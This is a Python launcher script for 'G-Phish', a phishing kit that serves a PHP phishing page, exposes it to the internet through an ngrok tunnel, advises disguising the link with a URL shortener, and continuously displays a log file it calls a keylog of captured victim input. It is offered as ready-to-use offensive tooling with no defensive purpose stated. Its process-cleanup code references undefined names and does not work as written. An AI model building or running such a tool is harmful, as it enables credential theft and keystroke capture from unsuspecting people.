# Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/gphish)

import warnings
import os, time, subprocess
from sys import platform, exit
import pyfiglet as figlet
from pyngrok import ngrok
warnings.filterwarnings("ignore")

if platform == "win32":
  clear = "cls"
else:
  clear = "clear"

if os.path.isfile("index.php"):
  file_exists = 1
else:
  print("Error : index.php not Found\nReinstall from : https://github.com/D4RKH0R1Z0N/gphish")
  exit()

os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 3")
time.sleep(1)
os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 2")
time.sleep(1)
os.system(clear)
print("Make sure you have PHP & SSH Installed or else this script won't work...\nStarting in 1")
time.sleep(1)
os.system(clear)

def program():
  banner = figlet.figlet_format("G-Phish", font = 'small') + "Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N)\n"
  ngrok.set_auth_token(input("Enter you Ngrok Token (To Host WebSite) : "))

  def log_get():
    time.sleep(1)
    os.system(clear)
    print(banner)
    print("[ G-Phish Log ]\n")
    log = open("log.txt", "r").read()
    print(log)

  print(banner)
  log = open("log.txt", "w")
  log.write(" New Log : ")
  log.close()
  print("Starting...")
  os.popen("php -q -S localhost:8080")
  os.system(clear)
  ngrok.connect(8080, bind_tls=True)
  url = ngrok.get_tunnels()
  print(url)
  print("You can use a Url Shortener's like bit.ly")
  print("Please copy the link")
  input("[ PRESS ANY KEY TO CONTINUE ]")
  input("[ PRESS ANY KEY TO CONFIRM ]")
  print(banner)
  print("Running...")
  time.sleep(1)
  while True:
    log_get()

try:
  while True:
    program()
except KeyboardInterrupt:
  ngrok.kill()
  if platform == "win32":
    try:
      os.system("taskkill /im php.exe")
    except:
      print("Error Killing PHP process please kill the process manually")
  else:
    name = "php"
    try:
      os.popen("ps ax | grep " + name + " | grep -v grep")
      fields = line.split()     
      pid = fields[0]
      os.kill(int(pid), signal.SIGKILL)
    except:
      print("Error Killing PHP process please kill the process manually")
  
  os.system(clear)
  print("Keylog save as : log.txt")
  print("\nExitting...")
  exit(0)
